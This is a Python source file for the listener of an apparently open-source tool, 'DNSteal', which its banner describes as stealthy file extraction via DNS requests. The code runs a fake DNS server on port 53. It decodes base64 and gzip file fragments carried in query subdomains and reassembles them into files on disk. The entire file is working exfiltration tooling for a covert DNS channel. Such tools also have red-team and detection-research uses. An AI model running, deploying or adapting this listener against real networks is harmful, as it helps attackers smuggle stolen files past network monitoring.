#!/usr/bin/env python3

import socket
import sys
import base64
import time
import hashlib
import zlib
import re

c = {"r": "\033[1;31m", "g": "\033[1;32m", "y": "\033[1;33m", "b": "\033[1;34m", "e": "\033[0m"}
VERSION = "3.0"

class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.data_text = ''

        tipo = (data[2] >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = data[ini]
            while lon != 0:
                self.data_text += data[ini + 1:ini + lon + 1].decode() + '.'
                ini += lon + 1
                lon = data[ini]

    def request(self, ip):
        packet = b''
        if self.data_text:
            packet += self.data[:2] + b"\x81\x80"
            packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += b'\xc0\x0c'  # Pointer to domain name
            packet += b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'  # Response type, TTL, resource data length (4 bytes)
            packet += bytes(map(int, ip.split('.')))
        return packet


def save_to_file(r_data, z, v):
    print("\n")

    for key, value in r_data.items():
        file_seed = time.strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"received_{file_seed}_{key}"
        # Sanitize filename: replace invalid characters with "_"
        file_name = re.sub(r'[\/:*?"<>|]', '_', file_name)

        flat_data = "".join(block[:-1].replace("*", "+") for block in value)

        try:
            with open(file_name, "wb") as f:
                if v:
                    print(f"{c['y']}[Info]{c['e']} Base64 decoding data ({key}).")
                flat_data = base64.b64decode(flat_data)

                if z:
                    if v:
                        print(f"{c['y']}[Info]{c['e']} Unzipping data ({key}).")
                    try:
                        flat_data = zlib.decompress(flat_data, 16 + zlib.MAX_WBITS)
                    except:
                        print(f"{c['r']}[Error]{c['e']} Could not unzip data. Did you specify the -z switch?")
                        sys.exit(1)

                print(f"{c['y']}[Info]{c['e']} Saving received bytes to './{file_name}'")
                f.write(flat_data)

            with open(file_name, "rb") as f:
                print(f"{c['g']}[md5sum]{c['e']} '{hashlib.md5(f.read()).hexdigest()}'\n")
        except Exception as e:
            print(f"{c['r']}[Error]{c['e']} {e}")
            sys.exit(1)


def banner():
    print("\033[1;32m")
    print(r"""
      ___  _  _ ___ _            _ 
     |   \| \| / __| |_ ___ __ _| |
     | |) | .` \__ \  _/ -_) _` | |
     |___/|_|\_|___/\__\___\__,_|_| """ + f"v{VERSION}")
    print(f"""\033[0m

Stealthy file extraction via DNS requests
    """)


if __name__ == '__main__':
    z = False
    v = False
    port = 53

    if "-h" in sys.argv or len(sys.argv) < 2:
        banner()
        sys.exit(1)

    ip = sys.argv[1]

    if not re.match(r"^((25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$", ip):
        print(f"{c['r']}[Error]{c['e']} First argument must be a valid IP address.")
        sys.exit(1)

    if "-z" in sys.argv:
        z = True
    if "-v" in sys.argv:
        v = True

    if "-p" in sys.argv:
        try:
            port = int(sys.argv[sys.argv.index("-p") + 1])
        except:
            print(f"{c['r']}[Error]{c['e']} Invalid port number.")
            sys.exit(1)

    banner()

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        udp.bind((ip, port))
    except:
        print(f"{c['r']}[Error]{c['e']} Cannot bind to {ip}:{port}")
        sys.exit(1)

    print(f"{c['g']}[+] {c['e']}DNS listening on '{ip}:{port}'")

    try:
        r_data = {}
        while True:
            data, addr = udp.recvfrom(1024)
            p = DNSQuery(data)
            udp.sendto(p.request(ip), addr)

            req_split = p.data_text.split(".")
            req_split.pop()

            dlen = len(req_split)
            fname = ""
            tmp_data = []

            for n in range(dlen):
                if req_split[n][-1] == ";":
                    tmp_data.append(req_split[n])
                else:
                    fname += req_split[n] + "."

            fname = fname.rstrip('.')
            fname = re.sub(r'[\/:*?"<>|]', '_', fname)

            if fname not in r_data:
                r_data[fname] = []

            print(f"{c['y']}[>]{c['e']} len: '{len(p.data_text)} bytes' - {fname}")
            if v:
                print(f"{c['b']}[>>]{c['e']} {p.data_text} -> {ip}:{port}")

            r_data[fname].extend(tmp_data)

            if r_data[fname][-1] == "=end=;":
                r_data[fname].pop()
                save_to_file(r_data, z, v)
                r_data.pop(fname)

    except KeyboardInterrupt:
        save_to_file(r_data, z, v)
        print(f"\n{c['r']}[!] {c['e']}Closing...")
        udp.close()
